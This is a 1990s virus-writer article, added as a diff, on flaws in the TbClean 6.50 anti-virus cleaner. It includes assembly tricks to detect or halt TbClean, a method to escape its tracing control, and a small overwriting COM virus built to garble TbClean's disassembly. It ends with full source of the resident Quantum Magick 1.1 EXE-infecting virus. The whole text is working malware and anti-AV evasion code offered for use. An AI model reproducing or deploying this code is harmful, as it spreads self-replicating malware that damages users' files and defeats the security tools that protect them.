@@ -1,0 +1,477 @@
+
+TbClean 6.50 Analysis, by Rajaat/Genesis and Rhincewind [Vlad]
+                       
+                       text by Rhincewind
+
+
+It was only recently that a virus author by the handle of Rajaat joined
+the international virus community on the internet. I was introduced to him
+by Qark and soon after pleasantly surprised by his knowledge and the obvious
+fun he derived from just playing around with technology, much like myself.
+
+We started a very high-paced e-mail discussion about various topics, amoung
+which TbClean. TbClean uses hardware real mode debugging (interrupt 1) which
+is odd for a commercial program since even the virus community, whose
+supporters can only code in their spare time, has access to a true code 
+emulator (ART).
+
+Detecting TbClean by detecting the real mode debugger is trivial. It is much
+more interesting to see if it has flaws in it's instruction handling since
+it denies access to interrupts, memory locations et cetera. Some of this
+control was already implemented in the first version, but a considerable
+amount was added after the Varicella incident, a virus containing code that
+broke out of the real mode debugger in a straightforward manner.
+
+Everything that follows was jointly developed by Rajaat and myself. It is
+as much his new information as it is mine. It is ours. Co-ops are great.
+
+
+To stop TbClean you need to know what can cause it to stop. Running it
+on a wide variety of code to see where it goes wrong, and then tracing parts
+of it's code seems to be an efficient way of developing retro technology.
+
+-
+1=- Interfering with TbClean by exploiting the program control.
+-
+
+I.    Stack
+
+TbClean needs to watch the stack, or you could crash it by setting SS:SP
+either to your own program, or to TbClean code and just PUSH'ing away.
+The solution chosen is to simply stop stracing if the stack location appears
+to be a risk.
+
+Setting the stack inside your code for a moment and then back is enough to
+get TbClean to quit. The smallest implementation we could come up with is:
+
+        cli
+        neg sp
+        neg sp
+        sti
+
+4 bytes.
+
+II.   Environment simulation
+
+In order to make programs behave normally while traced, TbClean builds a PSP
+below your code, just like DOS would. However, the PSP's are held together
+in a linked list and it wouldn't be nice if code could go up the chain to
+collect system information that might be vital. For this reason, the
+word at offset 16 in the PSP, which normally holds the segment of the parent
+PSP, points to it's own PSP. A traced program is it's own parent. Now, no
+other program except for the command interpreter is it's own parent so if
+a virus disallows interpreter infection, it could use the following to
+detect TbClean's presence:
+
+        (DS to PSP)
+        mov bx,ds
+        cmp bx, word ptr ds:[16h]
+        jz tbclean_active
+        ...
+tbclean_active:
+        ...
+
+III.  Context locking
+
+TbClean won't allow switching of the active PSP. It treats the get/set PSP
+calls as it does other system calls, it just doesn't execute them. However,
+it stops tracing when a call to create a PSP is made, possibly because you
+could also overwrite code with this function. Here's the exploit program:
+
+.model tiny
+.code
+org 100h
+start:
+        mov dx,ds
+        add dx, 12h
+        mov ah, 55h
+        int 21h
+        mov ah, 50h
+        mov bx,cs
+        int 21h
+        int 20h
+end start
+
+IV    Back to entrypoint
+
+TbClean stops tracing COM files when CS:IP hits CS:100h for the second time,
+thinking that the virus has restored the first bytes and is now trying to
+execute the host. A well-known exploit for this shortcoming is to put
+a LOOP $ instruction at CS:100h, before the jump to the viruscode.
+
+Another exploit for this same problem has been in use, which is to put
+a CMC (NOT the carry flag) at CS:100h and a JC 100 and CS:101h. On
+execution, the carry flag is clear so the CMC will set it on and the
+conditional jump would set IP back to 100h. TbClean quits tracing.
+
+Tracing this code again with TbClean 6.50 release, it didn't quit. As it
+turns out, the carry flag is on when Tb starts tracing your code, and of
+course it's still off under regular DOS execution. So all you need to do
+to let TbClean loop indefinitely is put a JC $ as the first line in your
+virus body (before the flags are modified).
+
+-
+2=- TbClean disassembler bugs.
+-
+
+I.    16-bit registers and 8-bit immediates.
+
+When TbClean encounters a xor/or/and/add/sub operation with a 16-bit register
+and an 8-bit immediate, the disassembler reveals a bug. The program control
+correctly sees a harmless opcode and allows it to execute. The
+disassembler however equates this class of opcodes with an operation
+involving a 16-bit register and a 16-bit immediate. The following happens,
+when you assemble this code:
+
+                mov dx,4 ;arbritrary byte value.
+                int 20h 
+
+and let TbClean disassemble it, it will say:
+                
+                mov dx, cd04
+                int 20
+
+II.   Segment overrides and REPs
+
+Multiple segments overrides before opcodes will corrupt TbClean's
+disassembly beyond the point of recognition. Often an opcode will just
+be disassembled as add ch,ah, or push es while it may be 4 bytes long.
+
+Obviously we tried to read from memory using repeated segment overrides
+but the program control did not fall for this.
+
+If you enjoy this kind of humour, assemble and TbClean the below overwriting
+virus. See if you can understand the disassembly.
+
+        .model tiny
+        .code
+        org 100h
+start:
+        db      13 dup (3eh)
+        mov     ah, 4eh
+        db      13 dup (3eh)
+        xor     cx, cx
+        db      12 dup (3eh)
+        mov     dx, offset filemask
+findfile_loop:
+        int     21h
+        db      13 dup (3eh)
+        jnc     more_files
+        jmp     all_files_done
+more_files:
+        db      12 dup (3eh)
+        mov     ax, 3d02h
+        db      12 dup (3eh)
+        mov     dx, offset 80h+1eh
+        int     21h
+        db      13 dup (3eh)
+        xchg    bx,ax
+        db      13 dup (3eh)
+        mov     ah, 40h
+        db      12 dup (3eh)
+        mov     cx, (endstart-start)
+        db      12 dup (3eh)
+        mov     dx, 100h
+        int     21h
+        db      13 dup (3eh)
+        mov     ah, 3eh
+        int     21h
+        db      13 dup (3eh)
+        mov     ah, 4fh
+        db      13 dup (3eh)
+        jmp     findfile_loop
+all_files_done:
+        int     20h
+filemask        db '*.COM',0        
+endstart:
+        end start
+
+-
+-3=- Breaking out of the program control
+-
+
+I.    The Bug
+
+Just as we were quite disappointed about not being able to circumvent 
+the memory read/write protection using segment overrides, we discovered 
+that a part of the disassembler is used for opcode type determination, 
+i.e. to see if a certain opcode is allowed to execute or not. 
+
+The overrides obviously did interfere with opcode type discrimination!
+
+Time to spill the beans. If you place an override or rep opcode before
+an interrupt opcode, TbClean will allow the interrupt to execute. Of course,
+the processor switches off the debugger before executing the interrupt
+handler, so by forcing two int calls to be executed you can do whatever
+you want. One thing you should mind, TbClean thinks the entire opcode
+(including override) is 4 bytes long so you need to add a NOP after the
+interrupt call.
+
+II.   Exploiting the Bug.
+
+Step 1 - Make a random interrupt point to your residency routine.
+Step 2 - Execute that interrupt.
+
+Now you are out of the program control in the sense that the debugger is
+disabled - you can execute any opcode you want to. However, you're still
+executing under the fake PSP. 
+
+But there's a convenient shortcoming here too. Creating a separate 
+environment block for the traced program was apparently too much of a 
+hassle as the environment block pointer at offset 2Ch in the faked PSP 
+points to TbClean's own environment block.
+
+As is documented in most technical references, the environment block is
+usually located directly before the program. Simply go from the environment
+block's segment to it's MCB, and go to the next MCB.
+
+Shrink this MCB using standard code, and copy your virus to TOM.
+
+Now, one problem left. If you conventionally hook interrupt 21h at this
+point, TbClean will restore it before exiting. One solution is to hook
+interrupt 22h by changing the vector stored in TbClean's PSP at offset 0A
+and hook interrupt 21h from that handler.
+
+Now you can just IRET from the interrupt, and let TbClean trace some more
+virus code to make it all look convincing. The virus will be made active
+by the interrupt 22h handler after TbClean exits.
+
+A major convenience is that this loading technique works under regular
+DOS execution as well. It is unnecessary to test for TbClean's presence.
+
+I made a quick update of my Quantum Magick virus to use the loading
+technique exactly as it is described above. Ironically enough, TbClean
+cures QM infections in tracing mode, but the virus goes resident again.
+
+
+Rajaat, thank you for our stimulating e-mail threads so far. I hope to see
+the first issue of a Genesis magazine shortly, and in the mean time let's
+see if we can document some other problems with popular anti-virus software.
+
+Take care everyone,
+Rhince.
+
+;======================== Begin Quantum Magick ===========================
+; Quantum Magick 1.1, by Rhincewind [Vlad]
+;
+; This is the original Quantum Magick virus, modified to break out of
+; TbClean's 'controlled' environment. Please read the accompanying textfile.
+
+        .model tiny
+        .code
+        org 0h
+        jumps
+start:
+        push ds
+        push es
+        call get_delta
+get_delta:
+        pop dx
+        add dx, (int3-get_delta)
+        mov ax, 2503h
+        push cs
+        pop ds
+        segds
+        int 21h
+        nop
+        segds
+        db 0cch
+        nop
+        pop es
+        pop ds
+        mov bx,ds
+        add bx,10h
+        call next2
+next2:  pop si
+        add bx, word ptr cs:[si+(_cs-next2)]
+        push bx
+        push word ptr cs:[si+(_ip-next2)]
+        xor ax,ax
+        xor bx,bx
+        xor cx,cx
+        cwd
+        xor si,si
+        xor di,di
+        retf
+        db 'Quantum Magick 1.1 - Breaking out of the TbClean 6.50 '
+        db 'environment.'
+int3:   push es
+        pop ds
+        mov ah, 30h
+        int 21h
+        cmp bh,30h
+        jz no_install
+        cmp al,3
+        jb no_install
+        xor di,di
+        mov bp, word ptr ds:[di+2ch]
+        dec bp
+        mov ds,bp
+        add bp, word ptr ds:[di+3]
+        inc bp
+        mov ds,bp
+        cmp byte ptr ds:[di],'Z'
+        jz install
+no_install:        
+        iret
+install:sub word ptr ds:[di+3], ((endvirus-start)+35)/16
+        sub word ptr ds:[di+12h], ((endvirus-start)+35)/16
+        mov es, word ptr ds:[di+12h]
+        mov si, dx
+        sub si, (int3-start)
+        mov cx, (endvirus-start)
+        push cs
+        pop ds
+        rep movsb
+        mov ds,bp
+        mov si, 1ah
+        movsw
+        movsw
+        mov word ptr [si-4],offset int22
+        mov word ptr [si-2],es
+        iret
+int21:  cmp ah, 3fh
+        jz viruzz
+        cmp ah, 30h
+        jnz no_chk
+        push ax
+        call call_int21
+        pop bx
+        retf 2
+        db 'Rhincewind [Vlad]'
+no_chk: jmp dword ptr cs:int21offset
+viruzz: cmp bl,5
+        jb no_chk
+        call call_int21
+        pushf
+        cmp ax, 18h
+        jb not_enough_bytes_read
+        push si
+        push ax
+        push cx
+        push dx
+        push di
+        push ds
+        push bx
+        push ax
+get_sft_address:
+        mov si, 1220h
+        xchg si,ax
+        int 2fh
+        mov si, 1216h
+        mov bl, byte ptr es:[di]
+        xchg si,ax
+        int 2fh
+        xor si,si
+        pop ax
+        mov bx,dx
+        xchg ax,cx
+        call getlen
+        sub ax, cx
+        jnz no_start_read
+        sbb dx, ax
+        jnz no_start_read
+start_read:
+        mov ax, 'ZM'
+        xor ax, word ptr ds:[bx]
+        jnz exit_read
+        cmp word ptr ds:[bx+18h], 40h
+        jz exit_read
+        cmp word ptr ds:[bx+1ah],si
+        jnz exit_read
+        mov ax, word ptr ds:[bx+0ah]
+        cmp ax, word ptr ds:[bx+0ch]
+        jz exit_read
+        cmp word ptr ds:[bx+0ch],si
+        jz exit_read
+        call getlen
+        mov cx, 10h
+        div cx
+        sub ax, word ptr ds:[bx+8]
+        xchg word ptr ds:[bx+14h], dx
+        xchg word ptr ds:[bx+16h], ax
+        mov cs:_cs,ax
+        mov cs:_ip,dx
+        mov cl,5
+        shr ax,cl
+        neg ax
+        add ax, word ptr ds:[bx+4]
+        cmp al,5
+        jb exit_read
+        call getlen
+        add ax, (endvirus-start)
+        adc dx, si
+        mov cx, 200h
+        div cx
+        or dx,dx
+        jz no_hiccup
+        inc ax
+no_hiccup:
+        mov word ptr ds:[bx+4],ax
+        mov word ptr ds:[bx+2],dx
+endcalc:mov dx,bx
+        pop bx
+        push word ptr es:[di+2]
+        push word ptr es:[di+15h]
+        push word ptr es:[di+17h]
+        mov byte ptr es:[di+2],2
+        mov word ptr es:[di+15h], 2
+        mov word ptr es:[di+17h], si
+        mov ah, 40h
+        mov cx, 18h
+        inc dx
+        inc dx
+        int 21h
+        call getlen
+        mov word ptr es:[di+15h], ax
+        mov word ptr es:[di+17h], dx
+        mov ah, 40h
+        push cs
+        pop ds
+        mov cx, (endvirus-start)
+        cwd
+        int 21h
+        pop word ptr es:[di+17h]
+        pop word ptr es:[di+15h]
+        pop word ptr es:[di+2]
+        jmp after_file_access
+no_start_read:
+exit_read:
+        pop bx
+after_file_access:
+        pop ds
+        pop di
+        pop dx
+        pop cx
+        pop ax
+        pop si
+not_enough_bytes_read:                
+        popf
+        retf 2
+        db 'Rajaat/Genesis'
+getlen: mov ax, word ptr es:[di+11h]
+        mov dx, word ptr es:[di+13h]
+        ret
+_cs     dw 0fff0h
+_ip     dw 0
+call_int21:
+        pushf
+        db 9ah
+int21offset dw ?
+int21seg    dw ?
+        ret
+int22:  push cs
+        pop ds
+        mov ax, 3521h
+        int 21h
+        mov int21offset,bx
+        mov int21seg,es
+        mov ax,2521h
+        mov dx,offset int21
+        int 21h
+        db 0eah
+endvirus: 
+int22offset dw ?
+int22seg    dw ?
+        end start
+;======================== END Quantum Magick ===========================
